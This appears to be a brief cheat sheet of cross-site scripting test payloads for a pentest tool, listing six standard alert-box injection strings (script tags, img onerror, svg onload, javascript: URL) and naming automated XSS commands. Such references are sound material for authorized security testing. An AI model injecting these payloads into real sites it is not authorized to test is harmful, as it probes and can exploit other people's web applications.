# XSS Payload Pack

**Trigger condition:** Manual XSS after filter/WAF or context-specific sink.

## Key Payloads
```
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
<svg/onload=alert(1)>
"><svg/onload=alert(document.domain)>
javascript:alert(1)
'"><img src=x onerror=alert(1)>
```

## Tools Available
| Tool | Command | Purpose |
|------|---------|---------|
| Deep Eye | `xss`, `stored_xss` | Auto |
